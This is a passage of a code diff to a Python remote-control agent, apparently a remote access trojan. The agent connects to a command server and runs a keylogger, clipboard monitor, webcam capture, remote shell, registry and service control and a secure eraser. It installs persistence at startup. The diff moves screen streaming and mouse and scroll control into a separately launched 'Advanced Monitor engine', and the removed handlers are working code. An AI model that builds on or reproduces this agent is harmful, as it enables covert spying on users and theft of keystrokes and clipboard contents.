+    def monitor_idx(self): return CONFIG["STREAM_MONITOR"]
+    @property
+    def fps(self): return CONFIG["STREAM_FPS"]
+    @fps.setter
+    def fps(self, v): pass
+    @property
+    def _quality_current(self): return CONFIG["STREAM_QUALITY"]
+    @_quality_current.setter
+    def _quality_current(self, v): pass
+    @property
+    def scale(self): return 1.0
+    @scale.setter
+    def scale(self, v): pass
+    def set_mode(self, mode): pass
 
 
 # ════════════════════════════════════════════════════════════════════════════
@@ -1937,8 +1957,6 @@ class ScreenConnectAgent:
     def _make_client(self):
         """Create a brand-new socketio.Client on every reconnect."""
         sio         = socketio.Client(logger=False, engineio_logger=False, reconnection=False)
-        cursor      = CursorTracker(sio)
-        streamer    = ScreenStreamer(sio, cursor)
         sys_monitor = SystemMonitor(sio)
         keylogger   = KeyLogger(sio)
         clipboard   = ClipboardMonitor(sio)
@@ -1956,14 +1974,14 @@ class ScreenConnectAgent:
         eraser      = SecureEraser()
 
         self._register_events(
-            sio, cursor, streamer, sys_monitor, keylogger, clipboard,
+            sio, sys_monitor, keylogger, clipboard,
             webcam, shell, proc_mgr, files, heartbeat, alerts,
             registry, services, winmgr, audio, apps, eraser,
         )
-        return sio, streamer, sys_monitor, heartbeat, cursor, keylogger, clipboard, alerts
+        return sio, sys_monitor, heartbeat, keylogger, clipboard, alerts
 
     def _register_events(
-        self, sio, cursor, streamer, sys_monitor, keylogger, clipboard,
+        self, sio, sys_monitor, keylogger, clipboard,
         webcam, shell, proc_mgr, files, heartbeat, alerts,
         registry, services, winmgr, audio, apps, eraser,
     ):
@@ -1988,7 +2006,6 @@ class ScreenConnectAgent:
                 pass
 
             heartbeat.start()
-            cursor.start()
             alerts.start()
             if CONFIG["ENABLE_KEYLOGGER"]:  keylogger.start()
             if CONFIG["ENABLE_CLIPBOARD"]:  clipboard.start()
@@ -1996,118 +2013,19 @@ class ScreenConnectAgent:
         @sio.event
         def disconnect():
             log.warning("Disconnected from server.")
-            streamer.stop()
             sys_monitor.stop()
             heartbeat.stop()
             alerts.stop()
-
-        @sio.on("frame_ack")
-        def on_frame_ack(data):
-            streamer.on_ack()
 
         @sio.on("request_action")
         def on_action(data):
             tab = data.get("tab", "")
             log.info(f"Action: {tab}")
 
-            # ── Monitor / Stream ───────────────────────────────────────────
-            if tab == "monitor":
-                action = data.get("action", "start")
-                if action == "start":
-                    streamer.start(
-                        monitor=data.get("monitor",  CONFIG["STREAM_MONITOR"]),
-                        fps=    data.get("fps",      CONFIG["STREAM_FPS"]),
-                        quality=data.get("quality",  CONFIG["STREAM_QUALITY"]),
-                        scale=  data.get("scale",    CONFIG["STREAM_SCALE"]),
-                        mode=   data.get("mode",     CONFIG["STREAM_MODE"]),
-                    )
-                elif action == "stop":
-                    streamer.stop()
-                elif action == "set_mode":
-                    streamer.set_mode(data.get("mode", "video"))
-                    sio.emit("action_result", {
-                        "device_id": CONFIG["DEVICE_TOKEN"],
-                        "action": "set_mode", "mode": streamer.mode, "success": True,
-                    })
-                elif action == "set_quality":
-                    q = max(10, min(95, int(data.get("quality", 55))))
-                    streamer._quality_current = q
-                elif action == "set_fps":
-                    streamer.fps = max(1, min(30, int(data.get("fps", 20))))
-                elif action == "set_scale":
-                    streamer.scale = max(0.2, min(1.0, float(data.get("scale", 0.75))))
-
-            # ── Screenshot ─────────────────────────────────────────────────
-            elif tab == "screenshot":
-                q   = data.get("quality", CONFIG["STREAM_QUALITY"])
-                s   = data.get("scale",   CONFIG["STREAM_SCALE"])
-                old_q, old_s = streamer.quality, streamer.scale
-                streamer.quality, streamer.scale = q, s
-                img = streamer.capture_single()
-                streamer.quality, streamer.scale = old_q, old_s
-                if img:
-                    sio.emit("screenshot_result", {
-                        "device_id": CONFIG["DEVICE_TOKEN"],
-                        "frame": img, "image": img,
-                        "ts": datetime.utcnow().isoformat(),
-                    })
-
-            # ── Mouse — FIXED: coord normalization ─────────────────────────
-            elif tab == "mouse_event":
-                if PYAUTOGUI_OK:
-                    # Support both absolute (x,y) and normalized (x_norm, y_norm)
-                    mon_w, mon_h = _get_monitor_resolution(streamer.monitor_idx)
-                    x_norm = data.get("x_norm")
-                    y_norm = data.get("y_norm")
-                    if x_norm is not None and y_norm is not None:
-                        # Normalized 0..1 → absolute pixels
-                        x = int(float(x_norm) * mon_w)
-                        y = int(float(y_norm) * mon_h)
-                    else:
-                        x = int(data.get("x", 0))
-                        y = int(data.get("y", 0))
-                    typ = data.get("type", "move")
-                    btn = {0: "left", 1: "middle", 2: "right"}.get(
-                        int(data.get("button", 0)), "left"
-                    )
-                    try:
-                        if   typ == "move":
-                            pyautogui.moveTo(x, y, duration=0, _pause=False)
-                        elif typ == "down":
-                            pyautogui.mouseDown(x, y, button=btn, _pause=False)
-                        elif typ == "up":
-                            pyautogui.mouseUp(x, y, button=btn, _pause=False)
-                        elif typ == "click":
-                            pyautogui.click(x, y, button=btn, _pause=False)
-                        elif typ in ("rclick", "rightclick"):
-                            pyautogui.click(x, y, button="right", _pause=False)
-                        elif typ == "dblclick":
-                            pyautogui.doubleClick(x, y, _pause=False)
-                        elif typ == "drag":
-                            tx = int(data.get("tx", x))
-                            ty = int(data.get("ty", y))
-                            pyautogui.dragTo(tx, ty, duration=0.08, button=btn, _pause=False)
-                    except Exception as e:
-                        log.warning(f"mouse_event error: {e}")
-
-            # ── Scroll ─────────────────────────────────────────────────────
-            elif tab == "scroll_event":
-                if PYAUTOGUI_OK:
-                    try:
-                        mon_w, mon_h = _get_monitor_resolution(streamer.monitor_idx)
-                        x_norm = data.get("x_norm")
-                        y_norm = data.get("y_norm")
-                        if x_norm is not None:
-                            x = int(float(x_norm) * mon_w)
-                            y = int(float(y_norm) * mon_h)
-                        else:
-                            x, y = int(data.get("x", 0)), int(data.get("y", 0))
-                        dy     = data.get("dy", 0)
-                        clicks = int(-dy / 120) if dy else 0
-                        if clicks:
-                            pyautogui.scroll(clicks, x=x, y=y, _pause=False)
-                    except Exception as e:
-                        log.warning(f"scroll_event error: {e}")
+            # ── Monitor/stream/mouse — handled by Advanced Monitor engine ──
+            # (frame_bin, cursor_bin, input_event are processed by _adv_main)
+            if tab in ("monitor", "mouse_event", "scroll_event", "frame_ack"):
+                pass  # no-op — Advanced Monitor engine handles these
 
             # ── Keyboard ───────────────────────────────────────────────────
             elif tab == "key_event":
@@ -2527,13 +2445,14 @@ class ScreenConnectAgent:
     def run(self):
         log.info(f"Screen Connect Agent v{CONFIG['AGENT_VERSION']} starting...")
         install_persistence()
-        _net_monitor.start()
+        # Launch the Advanced Monitor engine (second-site async engine) once
+        start_advanced_monitor(CONFIG["SERVER_URL"], CONFIG["DEVICE_TOKEN"])
         time.sleep(CONFIG["STARTUP_DELAY"])
 
         while not self._stop_flag.is_set():
-            sio = streamer = sys_monitor = heartbeat = cursor = keylogger = clipboard = alerts = None
+            sio = sys_monitor = heartbeat = keylogger = clipboard = alerts = None
             try:
-                sio, streamer, sys_monitor, heartbeat, cursor, keylogger, clipboard, alerts = self._make_client()
+                sio, sys_monitor, heartbeat, keylogger, clipboard, alerts = self._make_client()
                 log.info(f"Connecting to {CONFIG['SERVER_URL']}...")
                 sio.connect(
                     CONFIG["SERVER_URL"],
@@ -2547,7 +2466,7 @@ class ScreenConnectAgent:
             except Exception as e:
                 log.error(f"Agent error: {e}")
             finally:
-                for comp in [streamer, sys_monitor, heartbeat, cursor, keylogger, clipboard, alerts]:
+                for comp in [sys_monitor, heartbeat, keylogger, clipboard, alerts]:
                     try:
                         if comp and hasattr(comp, "stop"):
                             comp.stop()
